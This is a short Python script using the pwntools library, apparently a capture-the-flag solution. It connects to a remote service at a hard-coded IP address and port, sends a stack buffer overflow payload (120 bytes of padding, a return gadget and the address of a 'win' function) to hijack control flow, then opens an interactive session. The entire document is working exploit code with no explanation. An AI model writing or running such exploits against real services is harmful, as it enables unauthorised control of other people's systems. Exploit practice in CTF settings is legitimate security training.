from pwn import *

p = remote("103.185.44.122", 19000)

padding = 120
ret = p64(0x40101a)
win = p64(0x401216)


payload=b"A"*padding+ret+win

p.sendline(payload)
p.interactive()
